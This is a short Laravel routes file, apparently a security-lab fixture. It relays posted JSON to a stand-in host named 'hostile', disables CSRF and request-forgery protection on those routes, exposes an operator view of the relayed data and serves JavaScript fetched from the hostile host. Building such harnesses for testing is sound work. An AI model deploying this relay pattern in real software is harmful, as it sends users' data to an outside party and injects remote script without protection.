<?php
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Http;
use Illuminate\Http\Request;
Route::get('/',fn()=>view('solo'));
Route::post('/mirror',function(Request $r){
    $data=$r->json()->all();
    $response=Http::post('http://hostile:8080/mirror',$data);
    return response()->json($response->json(),$response->status());
})->withoutMiddleware([Illuminate\Foundation\Http\Middleware\ValidateCsrfToken::class,Illuminate\Foundation\Http\Middleware\PreventRequestForgery::class]);
Route::post('/relay',function(Request $r){
    $response=Http::timeout(30)->post('http://hostile:8080/relay',$r->json()->all());
    return response()->json($response->json(),$response->status());
})->withoutMiddleware([Illuminate\Foundation\Http\Middleware\ValidateCsrfToken::class,Illuminate\Foundation\Http\Middleware\PreventRequestForgery::class]);
Route::get('/operator-view',fn()=>Http::get('http://hostile:8080/mirror')->json());
Route::get('/delivered-client.js',fn()=>response(Http::get('http://hostile:8080/client.js')->body(),200,['Content-Type'=>'application/javascript']));
